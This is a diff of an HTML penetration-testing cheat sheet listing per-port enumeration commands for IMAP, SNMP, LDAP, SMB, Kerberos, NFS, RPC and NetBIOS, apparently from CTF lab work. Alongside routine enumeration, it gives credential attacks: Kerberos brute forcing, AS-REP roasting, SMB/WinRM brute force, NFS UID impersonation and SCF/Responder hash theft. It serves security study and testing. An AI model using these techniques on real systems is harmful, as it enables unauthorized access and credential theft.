-        <td>LOGIN &lt;username&gt; &lt;password&gt;<br><li>If enclosing values with quotes they must be escaped with a \</li></td>
-    </tr>
-    <tr>
-        <td>List Folders/Mailboxes</td>
-        <td>A1 LIST *<br>A1 LIST INBOX *<br>A1 LIST "Archive" *</td>
-    </tr>
-    <tr>
-        <td>Create new folder/inbox</td>
-        <td>A1 CREATE &lt;name&gt;"</td>
-    </tr>
-    <tr>
-        <td>Delete folder/mailbox</td>
-        <td>A1 DELETE &lt;name&gt;</td>
-    </tr>
-    <tr>
-        <td>Rename folder/mailbox</td>
-        <td>A1 RENAME &lt;mailbox to rename&gt; &lt;new name&gt;</td>
-    </tr>
-    <tr>
-        <td>List subscribed folders</td>
-        <td>A1 LSUB "" *</td>
-    </tr>
-    <tr>
-        <td>Status of a mailbox</td>
-        <td>A1 STATUS INBOX (messages unseen recent)</td>
-    </tr>
-    <tr>
-        <td>Select a mailbox</td>
-        <td>A1 SELECT INBOX</td>
-    </tr>
-    <tr>
-        <td>List Messages</td>
-        <td>List messages A1 FETCH:* (flags)<br>A1 UID FETCH 1:* (flags)</td>
-    </tr>
-    <tr>
-        <td>Retrieve message content</td>
-        <td>A1 FETCH 2 body[text]<br>A1 FETCH 2 all<br> A1 UID FETCH 102 (UID RFC822.SIZE BODY.PEEK[])</td>
-    </tr>
-    <tr>
-        <td>Close mailbox</td>
-        <td>A1 CLOSE</td>
-    </tr>
-    <tr>
-        <td>Logout</td>
-        <td>A1 LOGOUT</td>
-    </tr>
-</table>
-
-<h2>161 UDP / SNMP</h2>
-
-<ul>
-    <li>SNMP Management Information Base (MIB) - A database containing information usually related to network management</li>
-    <li>Simple Network Management Protocol.  Used for the management and monitoring of network devices.</li>
-    <li>Susceptible to IP spoofing and replay attacks because it is based on UDP</li>
-    <li>SNMP 1, 2, and 2c do not encrypt traffic.  Credentials and information can be intercepted over the local network.</li>
-    <li>Commonly left with configured with default public and private community strings.  Default read-only community string is usually "public"</li>
-    <ul>
-        <li>Community Strings/MIB Values:</li>
-        <table>
-            <tr>
-                <td>TCP Local Ports</td>
-                <td>1.3.6.1.2.1.6.13.1.3</td>
-            </tr>
-            <tr>
-                <td>User Accounts</td>
-                <td>1.3.6.1.4.1.77.1.2.25</td>
-            </tr>
-            <tr>
-                <td>Software Name</td>
-                <td>1.3.6.1.2.1.25.6.3.1.2</td>
-            </tr>
-            <tr>
-                <td>Storage Units</td>
-                <td>1.3.6.1.2.1.25.2.3.1.4</td>
-            </tr>
-            <tr>
-                <td>Processes Path</td>
-                <td>1.3.6.1.2.1.25.4.2.1.4</td>
-            </tr>
-            <tr>
-                <td>Running Programs</td>
-                <td>1.3.6.1.2.1.25.4.2.1.2</td>
-            </tr>
-            <tr>
-                <td>System Processes</td>
-                <td>1.3.6.1.2.1.25.1.6.0</td>
-            </tr>
-        </table>
-    </ul>
-    <li>Tools</li>
-    <ul>
-        <li>onesixtyone - SNMP scanner - brute force community strings</li>
-        <li>snmpwalk - probe and query SNMP values using a community string</li>
-        <table>
-            <tr>
-                <td>Enumerate full MIB Tree</td>
-                <td>snmpwalk -c public -v1 -t 10 &lt; address&gt;<br>snmpwalk -c public -v 2c -c public &lt;ip address&gt;</td>
-            </tr>
-            <tr>
-                <td>Enumerate Specific MIB value</td>
-                <td>snmpwalk -c public -v1 &lt;ip address&gt; &lt;Community String/MIB Value&gt;</td>
-            </tr>
-        </table>
-    </ul>
-</ul>
-
-<h2>389 TCP / LDAP</h2>
-<ul>
-    <li>TCP 389 LDAP plain text</li>
-    <li>Used for requesting information from the local domain controller.</li>
-    <li>LDAP requests sent to port 389 can be used to search for objects only within the global catalog’s home domain. </li>
-    <li>The requesting application can obtain all of the attributes for those objects.</li>
-    <ul>
-        <li>For example, a request to port 389 could be used to obtain a user’s department</li>
-    </ul>
-    <li>Tools</li>
-    <ul>
-        <li>nmap --script ldap-search</li>
-        <li>Listen on localhost for ldap traffic</li>
+        <li>Kerbrute</li>
         <ul>
-            <li>List on localhost for ldap traffic</li>
-            <ul>
-                <li>tcpdump -i lo -nnXs 0 'port 389'</li>
+            <li>Can enumerate AD usernames
                 <table>
                     <tr>
-                        <td>Do no conver hosts or ports to name</td>
-                        <td>nn</td>
+                        <td>Enumerate usename list</td>
+                        <td>userenum -d &gt;domain or ip&lt; &gt;username list&lt;<br>-/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt</td>
+                    </tr>
+                </table>
+            </li>
+            <li>Can also be used to brute force passwords.  Uses preauth method so it will not generate a typical failed login error code</li>
+        </ul>
+        <li>AS-REP Roasting</li>
+        <ul>
+            <li>Retrieve a ticket for a use that has DONT_REQ_PREAUTH enabled and then crack it</li>
+            <ul>
+                <li>DONT_REQ_PREAUTH means the DC will provide a TGT without verifying the request for the ticket was encrypted by the password of the user that is requesting the TGT.</li>
+            </ul>
+            <li>Attack can be done from machine that is not joined to the domain</li>
+            <ul>
+                <li>Enumeration is easier on a domain-joined machine - you can use LDAP Filter or PowerView to find targets</li>
+            </ul>
+            <li>Attack from a windows machine:</li>
+            <ul>
+                <li>Tools:</li>
+                <ul>
+                    <li>PowerView.ps1 - Enumerate Users</li>
+                    <li>ASREPRoast.ps1 - Retrieve ticket hashes</li>
+                    <li>Rebeus - C#/.NET replacement for ASREPRoast.ps1.  Harder for victim to detect.</li>
+                </ul>
+            </ul>
+            <li>Attack from linux</li>
+            <ul>
+                <li>User enumeration methods:</li>
+                <ul>
+                    <li>Using LDAP, may need a domain users credentials to access.</li>
+                    <li>Brute force - kerbrute</li>
+                    <li>Any other means</li>
+                </ul>
+                <li>Request tickets/retrieve hashes using Impacket-GetNPUsers</li>
+                <ul>
+                    <li>Impacket-GetNPUsers -dc-ip &lt;ip&gt; &lt;domain&gt;/ -no-pass -usersfile &lt;file&gt; -outputfile &lt;file&gt;&lt; -outputfile &lt;file&gt;</li>  
+                </ul>
+            </ul>
+        </ul>   
+    </ul>
+
+    <li>Good article on Kerberose attacking: https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html#as-rep-roasting</li>
+    <br>
+
+    <h2>110 TCP / POP3</h2>
+
+    <li>Post Office Protocol 3</li>
+    <ul>
+        <li>Used to receive emails</li>
+        <li>If we can log on to a POP3 server we can potentially read people's emails</li>
+        <li>Logging in can allow us to read data, not write</li>
+    </ul>
+    <li>Tools</li>
+    <ul>
+        <li>Evolution email client can be used</li>
+        <li>nc -nv &lt;ip address&gt; &lt;port&gt;</li>
+        <li>nc -nvC</li>
+        <ul>
+            <li>add C flag if not getting a response</li>
+        </ul>
+        <li>telnet</li>
+    </ul>
+
+    <table>
+        <tr>
+            <td>Pick username to login with</td>
+            <td>USER &lt;username&gt;</td>
+        </tr>
+        <tr>
+            <td>Enter password for user</td>
+            <td>PASS &lt;password&gt;</td>
+        </tr>
+        <tr>
+            <td>List Emails</td>
+            <td>LIST</td>
+        </tr>
+        <tr>
+            <td>Read email</td>
+            <td>RETR &lt;email # from LIST&gt;</td>
+        </tr>
+    </table>
+
+    <h2>111 TCP / rpcbind / NFS</h2>
+    <ul>
+        <li>A portmapper</li>
+        <li>Should list NFS ports</li>
+        <li>Like a telephone book, similar to DNS, that maps out program numbers to ports</li>
+        <li>Listens on port 111.  Maps RPC services to the ports they listen on.  Clients provide the program number they are trying to access and RPCbind redirects the client to the port # for that service.</li>
+        <li>Tools</li>
+        <ul>
+            <li>rpcinfo</li>
+            <ul>
+                <li>Utility that will connect to the RPC server and report back any information divulged by the server.</li>
+                <li>Command: rpcinfo &lt;ip address&gt;</li>
+                <table>
+                    <tr>
+                        <td>Compact Results</td>
+                        <td>-s</td>
                     </tr>
                     <tr>
-                        <td>Print in ascii and hex</td>
-                        <td>X</td>
-                    </tr>
-                    <tr>
-                        <td>Capture entire packet</td>
-                        <td>-s 0</td>
+                        <td>Display all registered RP programs and show port numbers</td>
+                        <td>-p</td>
                     </tr>
                 </table>
             </ul>
+            <li>nmap</li>
+            <ul>
+                <li>rpcinfo script</li>
+            </ul>
+            <li>netcat</li>
+            <ul>
+                <li>nc -nv &lt;ip address&gt;</li>
+            </ul>
         </ul>
-        <li>ldapsearch</li>
-        <table>
-            <tr>
-                <td>Basic search</td>
-                <td>ldapsearch -h &lt;ip address&gt;</td>
-            </tr>
-            <tr>
-                <td>Simple authentication</td>
-                <td>ldapsearch -h &lt;ip address&gt; -x</td>
-            </tr>
-            <tr>
-                <td>Authenticate as user</td>
-                <td>ldapsearch -h &lt;ip address&gt; -x -D '&ls;user&gt;@&lt;domain&gt;' -w '&lt;password&gt;' -b 'DC=something,DC=something'</td>
-            </tr>
-            <tr>
-                <td>Retrieve naming contexts</td>
-                <td>ldapsearch -h &lt;ip address&gt; -x -s base namingcontexts<br>Output can be thought of folders and they are different types of folders</td>
-            </tr>
-            <tr>
-                <td>Output all the LDAP information that can be queried</td>
-                <td>
+        <li>Network File System (NFS)</li>
+        <ul>
+            <li>Often used with Unix systems.  Can be difficult to setup securely so it is not uncommon that NFS shares are open to the world.</li>
+            <li>Gain access to files that show an owner with a UUID #</li>
+            <ul>
+                <li>Create a new user on local machine with same UUID # as the user that has access to that file or folder</li>
+                <ul>
+                    <li>Create and use imposter user:</li>
                     <ul>
-                        <li>ldapsearch -h &lt;ip address&gt; -x -b "DC=&lt;value&gt;,DC=&lt;value&gt;"</li>
-                        <ul>
-                            <li>DC=values from output of "Retrieving name contexts" command</li>
-                        </ul>
-                        <li>Terms to grep for on this file (can be done instead of querying ldap for a term directly):</li>
-                        <ul>
-                            <li>member</li>
-                            <li>CN=</li>
-                            <li>memberof</li>
-                            <li>user</li>
-                            <li>Password (and variations such as pwd)</li>
-                            <li>Look for anomalies in output</li>
-                            <ul>
-                                <li>cat &lt;ldap output file&gt; | awk '{print $1}' | sort | uniq -c | sort -nr</li>
-                            </ul>
-                        </ul>
+                        <li>adduser &lt;user&gt;</li>
+                        <li>Change UUID in /etc/passwd</li>
+                        <li>sudo su &lt;newuser&gt;</li>
                     </ul>
-                </td>
-            </tr>
-            <tr>
-                <td>Query LDAP</td>
-                <td>
-                    <ul>
-                        <li>ldapsearch -h &lt;ip address&gt; -x -b "DC=&lt;value&gt;,DC=&lt;value&gt;" '&lt;Query to search&gt;'</li>
-                        <ul>
-                            <li>Queries to search:</li>
-                            <ul>
-                                <li>objectClass=Person</li>
-                                <ul>
-                                    <li>pwdLastSet</li>
-                                    <ul>
-                                        <li>Convert to human readble using online converter:<br>https://www.epochconverter.com/ldap</li>
-                                    </ul>
-                                    <li>sAMAccountName = username</li>
-                                    <ul>
-                                        <li>User is equivalent (not equivalent as a filter)</li>
-                                    </ul>
-                                </ul>
-                            </ul>
-                        </ul>
-                    </ul>
-                </td>
-            </tr>
-            <tr>
-                <td>Query LDAP with Filters</td>
-                <td>
-                    <ul>
-                        <li>ldapsearch -h &lt;ip address&gt; -x -b "DC=&lt;value&gt;,DC=&lt;value&gt;" '&lt;Query to search&gt;' &lt;Filter&gt;</li>
-                        <ul>
-                            <li>Can add more than 1 filter</li>
-                            <ul>
-                                <li>'&lt;Query to search&gt;' &lt;filter 1&gt; &lt;filter 2&gt; &lt;filter 3&gt; ...</li> 
-                            </ul>
-                            <li>Filter examples</li>
-                            <ul>
-                                <li>sAMAccountName</li>
-                                <ul>
-                                    <li>Retrieve all usernames.  grep for sAMAccountName to get list of usernames.</li>
-                                    <ul>
-                                        <li>Accounts with $ are machine generated.  Passwords not crackable.</li>
-                                        <li>SM_  and HealthMailbox accounts are Exchange related.  Passwords not crackable.</li>
-                                    </ul>
-                                </ul>
-                                <li>Domain admins</li>
-                                <ul>
-                                    <li>"(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=htb,DC=local))"</li>
-                                </ul>
-                            </ul>
-                        </ul>
-                    </ul>
-                </td>
-            </tr>
-        </table>
+                </ul>
+            </ul>
+        </ul>
     </ul>
-</ul>
 
-
-<h2>443 TCP / HTTPS</h2>
-
-<li>Secure version of port 80.  Most of the same things apply</li>
-<li>Check certificate for any interesting information</li>
-<br>
-<h2>445 TCP / SMB</h2>
-
-<li>SMB is the protocol, CIFS is an old dialect of SMB, and my is the Linux/Unix-like implementation of the SMB protocol.</li>
-<li>Try logging in as guest as well as null authentication</li>
-<li>Brute force usernames by themselves or with passwords</li>
-<li>If errors with any  smb command install: cifs-utils</li>
-<li>enum4linux &lt;ip address&gt;</li>
-<li>Mounting SMB share</li>
-<table>
-    <tr>
-        <td>Mount SMB Share</td>
-        <td>
-            <table>
+    <table>
+        <tr>
+            <td>Mount NFS Share</td>
+            <td>sudo mount -o nolock &lt;ip address&gt;:/&lt;share name&gt; ~/&lt;Local directory to mount to&gt;<br><table>
                 <tr>
-                    <td>Create a folder to mount to</td>
-                    <td>sudo mkdir /mnt/&lt;folder&gt;</td>
+                    <td>Disable File locaking.  Often needed for older NFS servers</td>
+                    <td>-o nolock</td>
+                </tr>
+            </table></td>
+        </tr>
+        <tr>
+            <td>Show mounting information</td>
+            <td>showmount<br><table>
+                <tr>
+                    <td>Show all mount points</td>
+                    <td>-a</td>
                 </tr>
                 <tr>
-                    <td>Mounting command and some different options</td>
-                    <td>
-                        <li>sudo mount -t cifs -o vers=1.0 //10.11.1.136/'&lt;share name&gt;' /mnt/&lt;folder&gt;</li>
+                    <td>Show all directories</td>
+                    <td>-d</td>
+                </tr>
+                <tr>
+                    <td>Show export list</td>
+                    <td>-e</td>
+                </tr>
+            </table></td>
+        </tr>
+    </table>
+
+    <h2>113 TCP / ident</h2>
+
+    <ul>
+        <li>Used to identify who is using a TCP connection</li>    
+        <ul>
+            <li>By default nmap -sC will enumerate every use of every running port</li>
+        </ul>
+    </ul>
+
+    <h2>119 TCP / NNTP</h2>
+
+    <ul>
+        <li>Network News Transfer Protocol</li>
+        <ul>
+            <li>Tools</li>
+            <ul>
+                <li>netcat</li>
+                <ul>
+                    <li>nc -nv &lt;ip address&gt; &lt;port&gt;</li>
+                </ul>
+            </ul>
+            <li>Commands:</li>
+            <table>
+                <tr>
+                    <td>List available commands</td>
+                    <td>HELP</td>
+                </tr>
+                <tr>
+                    <td>List available articles to read</td>
+                    <td>LIST<br>Example:<br><table>
+                        <tr>
+                            <td>LIST<br>215 list of newsgroups follows<br>org.apache.avalon.dev 0 0 y<br>org.apache.avalon.user 0 0 y</td>
+                        </tr>
+                    </table><br>The 0 in each column means the first and last article for each newgroup is 0.  This means there are no article available to read.</td>
+                </tr>
+            </table>
+        </ul>
+    </ul>
+
+    <h2>135 TCP / msrpc</h2>
+
+    <ul>
+        <li>Lists all rpc endoints</li>
+        <ul>
+            <li>Typically lists a ton of information that makes it tough to work with</li>
+            <li>Used with other exploits like SMB relays</li>
+        </ul>
+        <li>impacket-rpcdump</li>
+        <table>
+            <tr>
+                <td>Dump all information</td>
+                <td>impacket-rpcdump &lt;ip address&gt;</td>
+            </tr>
+        </table>
+        <li>impacket-rpcmap</li>
+        <table>
+            <tr>
+                <td>Map rpc information</td>
+                <td>'ncacn_ip_tcp:&lt;ip address&gt;'</td>
+            </tr>
+            <tr>
+                <ul>
+                    <li>Brute force the endpoints we can interact with and the specific methods</li>
+                    <ul>
+                        <li>Google the UUID's</li>
                         <ul>
-                            <li>-o username=&lt;username&gt;,dir_mode=777,file_mode=666</li>
-                            <li>-o username=&lt;username&gt;,uid=user,gid=group</li>
-                            <li>-o 'user=&lt;username&gt;,password=&lt;password&gt;'</li>
+                            <li>site: docs.microsoft.com &lt;UUID&gt;</li>
+                        </ul>
+                    </ul>
+                </ul>
+            </tr>
+        </table>
+        <li>metasploit</li>
+        <ul>
+            <li>/auxiliary/scanner/dcerpc/endpoint_mapper</li>
+            <li>/auxiliary/scanner/dcerpc/hidden</li>
+        </ul>
+    </ul>
+
+    <h2>139 TCP / Netbios</h2>
+
+    <ul>
+        <li>Netbios is different from SMB</li>
+        <li>A session layer protocol and service that allows computers on a local network to communicate with each other.</li>
+        <li>Modern implementations of SMB do not require netbios.</li>
+        <li>netbios is required for backwards compatibility with SMB.</li>
+        <li>Tools:</li>
+        <ul>
+            <li>nbtscan</li>
+            <table>
+                <tr>
+                    <td>Example Usage</td>
+                    <td>sudo nbtscan -r &lt;ip address or range&gt;</td>
+                </tr>
+                <tr>
+                    <td>Specify the originating UDP port as 137</td>
+                    <td>-r</td>
+                </tr>
+            </table>
+            <li>rpcclient</li>
+            <table>
+                <tr>
+                    <td>Typical authentication</td>
+                    <td>rpcclient &lt;ip address&gt;</td>
+                </tr>
+                <tr>
+                    <td>
+                        <ul>
+                            <li>Null Authentication</li>
+                            <ul>
+                                <li>This generally works on Domains from 2003.  Newly installed domains do not like null authentication</li>
+                                <li>If this works then note that null authentication allows domain enumeration and a lot of information can be found</li>
+                            </ul>
+                        </ul>
+                    </td>
+                    <td>rpcclient -U '' -N &lt;ip address&gt;</td>
+                </tr>
+                <tr>
+                    <td>Enumerate Users</td>
+                    <td>enumdomusers<br>querydispinfo</td>
+                </tr>
+                <tr>
+                    <td>Get user SID</td>
+                    <td>lookupnames &gt;username&lt;</td>
+                </tr>
+                <tr>
+                    <td>Enumerate user groups</td>
+                    <td> &lt;[rid value]&gt;</td>
+                </tr>
+                <tr>
+                    <td>Query group name from rid value</td>
+                    <td>querygroup &lt;rid value&gt;</td>
+                </tr>
+                <tr>
+                    <td>Enumerate printers</td>
+                    <td>enumprinters</td>
+                </tr>
+                <tr>
+                    <td>Enumerate groups</td>
+                    <td>enumalsgroups [Builtin|Domain]</td>
+                </tr>
+                <tr>
+                    <td>Enumerate users (output in SID) in groups</td>
+                    <td>queryaliasmem [Builtin|Domain] &lt;rid&gt;</td>
+                </tr>
+                <tr>
+                    <td>Change users password (must log in to rpcclient as user)</td>
+                    <td>setuserinfo2 &lt;username&gt; 23 '&lt;password&gt;'
+                        <ul>
+                            <li>23 is the USER_INTERAL4_INFORMATION field.  It does things in cleartext.  24 supports encrpytion</li>
+                            <li>NT_STATUS_PASSWORD_RESTRICTION means there was a password complexity failure and the password did not change</li>
                         </ul>
                     </td>
                 </tr>
                 <tr>
-                    <td>Unmount SMB Share (Forced & Lazy)</td>
-                    <td>sudo umount -f &lt;mounted share directory&gt;</td>
-                </tr>
-            </table>
-        </td>
-    </tr>
-</table>
-<li>crackmapexec</li>
-<table>
-    <tr>
-        <td>Check password policies</td>
-        <td>crackmapexec smb --pass-pol &lt;ip address&gt;</td>
-    </tr>
-    <tr>
-        <td>Check password policies with null authentication</td>
-        <td>
-            <li>crackmapexec smb --pass-pol &lt;ip address&gt; -u '' -p ''</li>
-            <ul>
-                <li>This generally works on Domains from 2003.  Newly installed domains do not like null authentication</li>
-                <li>If this works then note that null authentication allows domain enumeration and a lot of information can be found</li>
-            </ul>
-        </td>
-    </tr>
-    <tr>
-        <td>
-            <li>Enumerate SMB Shares</li>
-            <ul>
-                <li>Attempt with non-existent username and password</li>
-            </ul>
-        </td>
-        <td>smb -u &lt;username&gt; -p &lt;password&gt; --shares</td>
-    </tr>
-    <tr>
-        <td>SMB Brute force</td>
-        <td>smb -u &lt;username&gt; -p &lt;password&gt;</td>
-    </tr>
-    <tr>
-        <td>WinRM Brute Force</td>
-        <td>
-            <li>winrm -u &lt;username&gt; -p &lt;password&gt;</li>
-            <ul>
-                <li>If successful, get shell using evil-winrm</li>
-            </ul>
-        </td>
-    </tr>
-    <tr>
-        <td>
-            <li>Crawl shares and output in json format</li>
-            <ul>
-                <li>Read output with jq . &lt;file&gt;</li>                
-            </ul>
-        </td>
-        <td>-M spider_plus</td>
-    </tr>
-</table>
-<li>Query registry information - impacket-reg</li>
-<table>
-    <tr>
-        <td>Query HKU</td>
-        <td>impacket-reg -hashes &lt;LM:NTLM hashes&gt; &lt;domain&gt;/&lt;username&gt;@&lt;ip address&gt; query -keyName HKU\\</td>
-    </tr>
-    <tr>
-        <td>Query HKLM</td>
-        <td>impacket-reg -hashes &lt;LM:NTLM hashes&gt; &lt;domain&gt;/&lt;username&gt;@&lt;ip address&gt; query -keyName HKLM\\</td>
-    </tr>
-</table>
-<li>Interesting registeries</li>
-<ul>
-    <li>Some software might store secrets in this directory</li>
-</ul>
-
-<li>Responder</li>
-<ul>
-    <li>Intercept SMB logon requests and gain the hash to crack</li>
-</ul>
-<li>smbpasswd</li>
-<table>
-    <tr>
-        <td>Change user password</td>
-        <td>smbpasswd -U &lt;username&gt; -r &lt;domain or ip&gt;</td>
-    </tr>
-</table>
-<li>nmap</li>
-<table>
-    <td>
-        <li>Enumerate share paths</li>
-        <ul>
-            <li>May append a C: to the beginning even if it is a Linux host</li>
-        </ul>
-    </td>
-    <td>nmap --script smb-enum-shares</td>
-</table>
-<li>smbmap</li>
-<table>
-    <tr>
-        <td>
-            <li>list smb shares</li>
-            <ul>
-                <li>Attempt with non-existent username</li>
-            </ul>
-        </td>
-        <td>smbmap –H &lt;ip address&gt; -u &lt;username ex. guest&gt;</td>
-    </tr>
-    <tr>
-        <td>Recursively show  all files/shares</td>
-        <td>-R</td>
-    </tr>
-</table>
-<li>smbclient</li>
-<table>
-    <tr>
-        <td>List smb shares</td>
-        <td>smbclient -L &lt;ip address&gt;</td>
-    </tr>
-    <tr>
-        <td>Download all SMB files w/ smbclient</td>
-        <td>
-            <li>smbclient //&lt;ip address&gt;/&lt;share name&gt;</li>
-            <li>recurse ON</li>
-            <li>prompt OFF</li>
-            <li>mget *</li>
-        </td>
-    </tr>
-    <tr>
-        <td>Connect to share</td>
-        <td>smbclient //&lt;ip address&gt;/&lt;share name&gt;</td>
-    </tr>
-    <tr>
-        <td>Show extended file attributes</td>
-        <td>allinfo &lt;file&gt;</td>
-    </tr>
-    <tr>
-        <td>Download data stream file</td>
-        <td>get "&lt;Parent File&gt;:&lt;Data Stream File&gt;"</td>
-    </tr>
-</table>
-<li>smbcacls</li>
-<table>
-    <tr>
-        <td>See folder permissions</td>
-        <td>smbcacls -N '//&lt;ip address&gt;/&lt;share&gt;' /&lt;folder&gt;</td>
-    </tr>
-</table>
-<li>If access to write to SMB share</li>
-<ul>
-    <li>SCF File attack</li>
-    <ul>
-        <li>Create icon on windows that has the icon image set on remote ip.  When Windows tries to pull that icon it authenticates to the remote server.  Hash can then be stolen.</li>
-        <li>https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/</li>
-    </ul>
-</ul>
-<li>Enumerate samba version</li>
-<table>
-    <tr>
-        <td>Wireshark</td>
-        <td>
-            <li>Log in anonymously (smbclient -L \\&lt;ip address&gt;)</li>
-            <li>Search for packet with "Session Setup Andx Responses" in the info field</li>
-        </td>
-    </tr>
-    <tr>
-        <td>ngrep & smbclient</td>
-        <td>
-            <li>Terminal 1</li>
-            <ul>
-                <li>ngrep -i -d tap0 's.?a.?m.?b.?a.*[[:digit:]]' port 139</li>
-            </ul>
-            <li>Terminal 2</li>
-            <ul>
-                <li>echo exit | smbclient -L &lt;ip address&gt;</li>
-            </ul>
-        </td>
-    </tr>
-</table>
-<li>Error correction - NT_STATUS_CONNECTION_DISCONNECTED</li>
-<ul>
-    <li>Most likely smb is using too new of a protocol and needs to be manually set to use an older one</li>
-    <table>
-        <tr>
-            <td>Fix #1 - smbclient flag</td>
-            <td>smbclient //&lt;ip address&gt;/&lt;share name&gt; --option='client min protocol=NT1'</td>
-        </tr>
-        <tr>
-            <td>Fix #2 - Change config file</td>
-            <td>
-                <li>Append to global section of /etc/samba/smb.conf:</li>
-                <ul>
-                    <li>client min protocol = NT1</li>
-                    <ul>
-                        <li>Might need client min protocol = LANMAN1</li>
-                    </ul>
-                </ul>
-                <li>service smbd restart</li>
-            </td>
-        </tr>
-    </table>
-</ul>
-<li> SMB Protocols</li>
-<ul>
-    <li>By default SMB2 selects the SMB2_10 variant.</li>
-    <li>By default SMB3 selects the SMB3_00 variant.</li>
-</ul>
-<table>
-    <tr>
-        <td>LANMAN1</td>
-        <td>First modern version of the protocol. Long filename support.</td>
-    </tr>
-    <tr>
-        <td>LANMAN2</td>
-        <td> Updates to Lanman1 protocol.</td>
-    </tr>
-    <tr>
-        <td>NT1</td>
-        <td>Current up to date version of the protocol. Used by Windows NT. Known as CIFS.</td>
-    </tr>
-    <tr>
-        <td>SMB2</td>
-        <td>Re-implementation of the SMB protocol. Used by Windows Vista and later versions of Windows. SMB2 has sub protocols available.</td>
-    </tr>
-    <tr>
-        <td>SMB2_02</td>
-        <td>The earliest SMB2 version.</td>
-    </tr>
-    <tr>
-        <td>SMB2_10</td>
-        <td>Windows 7 SMB2 version.</td>
-    </tr>
-    <tr>
-        <td>SMB2_22</td>
-        <td>Early Windows 8 SMB2 version.</td>
-    </tr>
-    <tr>
-        <td>SMB2_24</td>
-        <td>Windows 8 beta SMB2 version.</td>
-    </tr>
-    <tr>
-        <td>SMB3</td>
-        <td>The same as SMB2. Used by Windows 8. SMB3 has sub protocols available.</td>
-    </tr>
-    <tr>
-        <td>SMB3_00</td>
-        <td>Windows 8 SMB3 version. (mostly the same as SMB2_24)</td>
-    </tr>
-</table>
-
-<h2>464 TCP / kpasswd5</h2>
-<li>Used for changing/setting passwords against Active Directory.</li>
-<br>
-<h2>500 UDP / ISAKMP</h2>
-<li>Used for Internet Key Exchange (IKE)</li>
-<li>nmap can only scan open TCP ports through IPSEC VPN using -sT (connect scan?)</li>
-<ul>
-    <li>Used to establish an IPSEC VPN</li>
-    <ul>
-        <li>Internet Protocol Security (IPSEC) is a suite of tools that are used for securing network traffic at the IP Layer.</li>
-        <ul>
-            <li>AH and ESP protocols provide security assurances:</li>
-            <ul>
-                <li>Authentication Header (AH)</li>
-                <ul>
-                    <li>Provides data integrity (We will now if the data has been modified between senders).</li>
-                    <li>Data source authentication (We will know if the source isn't what is expected for that connection).</li>
-                    <li>Protection against replay attacks.</li>
-                </ul>
-                <li>Encapsulating Security Payloads(ESP)</li>
-                <ul>
-                    <li>Provides similar capabilities as AH plus confidentiality (Someone in the middle won't be able to see the data)</li>
-                </ul>
-                <li>Both of these protocols can operate in two modes:</li>
-                <ul>
-                    <li>Transport mode</li>
-                    <ul>
-                        <li>The IP of the packet is sent in the clear over the internet for routing, but the payload is encrypted.</li>
-                        <li>Typically used directly host to host</li>
-                    </ul>
-                    <li>Tunnel mode</li>
-                    <ul>
-                        <li>The entire IP packet is encrypted and becomes the payload of another IP packet.  The header of the new packet directs where the packet goes.</li>
-                        <li>Typically used when a computer is behind a network.</li>
-                    </ul>
-                </ul>
-            </ul>
-            <li>There are also security associations (SA) used with IPSEC.  This provides a bundle of algorithms to dynamically exchange keys and establish a secure connection over AH or ESP.  IKE is one of those.</li>
-        </ul>
-    </ul>
-</ul>
-<li>Tools:</li>
-<ul>
-    <li>ike-scan</li>
-    <ul>
-        <li>ike-scan -M &lt;ip address&gt;</li>
-        <ul>
-            <li>Enumerates:</li>
-            <ul>
-                <li>IKE Encryption type</li>
-                <li>Auth type (PSK, etc)</li>
-                <li>IKE version (v1 or v2)</li>
-            </ul>
-        </ul>
-    </ul>
-    <li>strongswan</li>
-    <ul>
-        <li>Used to connect to VPN once password is known</li>
-        <li>Avoid errors:</li>
-        <ul>
-            <li>sudo apt install libstrongswan-standard-plugins</li>
-            <li>sudo apt install libstrongswan-extra-plugins</li>
-        </ul>
-        <li>Must edit local files to connect to VPN</li>
-        <ul>
-            <li>/etc/ipsec.secrets</li>
-            <table>
-                <tr>
-                    <td>Fields Explained</td>
-                    <td><pre># This file holds shared secrets or RSA private keys for authentication.
-                    %any : &lt;Authentication Type - Example: PSK&gt; "&lt;VPN Password&gt;"</pre></td>
+                    <td>Enumerate Domains</td>
+                    <td>enumdomains</td>
                 </tr>
                 <tr>
-                    <td>Example file</td>
-                    <td><pre># This file holds shared secrets or RSA private keys for authentication.
-                    %any : PSK "Dudecake1!"</pre></td>
-                </tr>
-            </table>
-            <li>/etc/ipsec.conf</li>
-            <table>
-                <tr>
-                    <td>Fields Explained</td>
-                    <td><pre># ipsec.conf - strongSwan IPsec configuration file
-
-                        config setup
-                        charondebug="all"
-                        # More verbose for troubleshooting connection
-
-                        uniqueids=yes
-                        strictcrlpolicy=no
-                        conn conceal
-                        authby=secret
-                        # Auth type.  PSK = secret
-
-                        auto=add
-                        ike=&lt;Value 1&gt;-&lt;Value 2&gt;-&lt;Value 3&gt;!
-                        # ike-scan values: Enc=&lt;Value 1&gt; Hash=&lt;Value 2&gt;; Group=2:&lt;value 3&gt;
-
-                        esp=&lt;Value 1&gt;-&lt;Value 2&gt;!
-                        # ike-scan values: Enc=&lt;Value 1&gt;; Hash=&lt;Value 2&gt;
-
-                        type=transport
-                        # ipsec transport mode
-
-                        keyexchange=ikev1
-                        # ike-scan value: (IKE CGA version 1) = ikev1
-
-                        left=&lt;Local Machine IP&gt;
-                        right=&lt;Remote Machine IP&gt;
-                        rightsubnet=&lt;Remote Machine IP&gt;[tcp]
-                    </pre></td>
+                    <td>Domain SID</td>
+                    <td>lsaquery</td>
                 </tr>
                 <tr>
-                    <td>Example File</td>
-                    <td><pre># ipsec.conf - strongSwan IPsec configuration file
-
-                        config setup
-                        charondebug="all"
-                        uniqueids=yes
-                        strictcrlpolicy=no
-
-                        conn conceal
-                        authby=secret
-                        auto=add
-                        ike=3des-sha1-modp1024!
-                        esp=3des-sha1!
-                        type=transport
-                        keyexchange=ikev1
-                        left=10.10.14.6
-                        right=10.10.10.116
-                    rightsubnet=10.10.10.116[tcp]</pre></td>
+                    <td>Domain info</td>
+                    <td>querydominfo</td>
+                </tr>
+                <tr>
+                    <td>Create domain user</td>
+                    <td>createdomuser</td>
+                </tr>
+                <tr>
+                    <td>delete domain user</td>
+                    <td>deletedomuser</td>
+                </tr>
+                <tr>
+                    <td>Add rights to user account</td>
+                    <td>lsaaddacctrights</td>
+                </tr>
+                <tr>
+                    <td>Remove rights from user account</td>
